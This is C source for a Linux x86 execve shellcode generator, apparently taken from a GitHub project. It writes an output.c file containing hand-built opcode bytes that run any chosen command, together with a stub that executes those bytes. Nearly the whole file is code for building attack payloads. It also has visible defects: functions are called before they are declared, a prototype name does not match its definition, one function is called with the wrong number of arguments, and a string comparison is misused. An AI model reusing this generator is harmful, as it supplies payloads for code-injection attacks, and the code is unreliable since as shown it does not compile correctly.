//https://github.com/CallumBodels/Linux-x86-Execve-Shellcode-Generator
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void writeShellcodeToFile(FILE* f,char* shellcode);
char* padWithSlashes(char* string);
char* padWithSpaces(char* string);
void createEmptyArray(FILE *f,int size);

int main(int argc, char *argv[]){
	if(argc > 1){
		FILE *f = fopen("output.c","w");
		//write to the file the C imports and setup the char* opcode container
		fprintf(f, "#include <stdio.h>\n#include <unistd.h>\n\n//Assemlbly comments in NASM syntax.\nchar *shellcode=\"\\x31\\xc0\" //xor eax,eax\n");

		char* commandPadded = padWithSlashes(argv[1]);
		//push the string onto the stack
		pushString(f,commandPadded);
		//push current stack point into ebx, aka pointer to argv[1]
		fprintf(f, "\"\\x89\\xe3\" //mov ebx,esp\n");

		//create array for argv[] arg of execve
		createPointerArray(f,(argc-1));

		//push each arg of the desired command onto stack, get the addr and then insert the addr into the argv[] array
		for(int i = 2; i < argc; i++){
			char* argPadded = padWithSpaces(argv[i],1);

			//if arg to add starts with tac use dif method as currently function doesnt work with strings with '-'s
			char tac = '-';
			if( (strncmp(&tac, argPadded, 1) == 0) ){
				//only works for flags of one char length
				fprintf(f, "\"\\x50\" //push eax\n");
				fprintf(f, "\"\\x66\\x68\\x%x\\x%x\" //pushw '%c%c'\n",argPadded[0],argPadded[1],argPadded[0],argPadded[1]);
			}else{
				pushString(f,argPadded);
			}

			//get the addr of the current string pushed onto stack and then move the addr onto the argv[] array
			fprintf(f, "\"\\x89\\xe2\" //mov edx,esp\n\"\\x89\\x51\\x%x\" //mov [ecx+%d],edx\n",((i-1)*4),((i-1)*4));
		}
		//point the envp[] arg of execve to null
		//push execve sys call number(11) into eax, and call sys interupt to execute execve
		//write to file C code function to call the opcode shellcode char* output
		fprintf(f, "\"\\x50\" //push eax\n\"\\x89\\xe2\" //mov edx,esp\n\"\\xb0\\x0b\" //mov al,11\n\"\\xcd\\x80\"; //int $0x80\n\nint main(){\n    int (*ret)() = (int(*)())shellcode;\n    ret();\n}\n");
		fclose(f);
	}else{
		printf("Usage: ./shellcodeGenerator.out <desired command> <(OPTIONAL)desired args>... \n");
	}
}

void createPointerArray(FILE* f,int size){
	//push null pointer arguement, as they will be elements in the array, the null pointers will be overwritten later with the elements addr after we know it from pushing them onto the stack
	//extra null pointer at the end to show the end of the array
	for(int i = 0; i < size; i++){
		fprintf(f, "\"\\x50\" //push eax\n");
	}
	//push ebx onto the end of the array; as it is the first element of the array
	//and then save the addr of the array into ecx
	fprintf(f, "\"\\x53\" //push ebx\n\"\\x89\\xe1\" //mov ecx,esp\n");
}

//TODO make it universal so it can deal with '-' starting args
void pushString(FILE* f,char* shellcode){
	//push eax for null byte to show end of string
	fprintf(f, "\"\\x50\" //push eax\n");
	//push hex of each char of the string in reverse order
	for(int i = (strlen(shellcode)); i > 0; i = i - 4){
		fprintf(f,"\"\\x68\\x%x\\x%x\\x%x\\x%x\" //push '%c%c%c%c'\n",shellcode[i-4],shellcode[i-3],shellcode[i-2],shellcode[i-1],shellcode[i-4],shellcode[i-3],shellcode[i-2],shellcode[i-1]);
	}
}

char* padWithSpaces(char* string){
	//work out how many spaces are needed for padding and setup string of that size
	int paddingNeeded = (4 -((strlen(string))%4));
	//extra char for null byte to show strings ended
	char* returning = calloc((paddingNeeded+strlen(string)+1),sizeof(char));

	//add spaces at end of the arg as it doesnt effect the arg
	strncpy(&returning[0],string,strlen(string));
	for(int i = 0;i < paddingNeeded; i++){
		strncpy(&returning[(i+strlen(string))]," ",1);
	}

	return (returning);
}

char* padWithSlashes(char* string){
	//work out how many /'s are needed for padding and setup string of that size
	int paddingNeeded = (4 -((strlen(string))%4));
	//extra char for null byte to show strings ended
	char* returning = calloc((paddingNeeded+strlen(string)+1),sizeof(char));

	//add slashes at start of the command as it doesnt effect the command
	for(int i = 0;i < paddingNeeded; i++){
		strncpy(&returning[i],"/",1);
	}
	strncpy(&returning[paddingNeeded],string,strlen(string));

	return (returning);
}
